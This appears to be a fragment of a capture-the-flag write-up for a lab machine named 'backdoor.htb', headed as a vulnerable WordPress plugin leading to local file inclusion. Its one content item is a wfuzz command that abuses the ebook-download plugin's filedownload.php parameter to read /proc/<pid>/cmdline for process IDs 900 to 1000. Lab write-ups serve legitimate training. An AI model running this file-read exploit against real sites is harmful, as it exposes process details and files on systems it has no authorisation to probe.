### Vuln Plugin lead to LFI

##### Fuzz process via /proc/FUZZ/cmdline
```
wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
```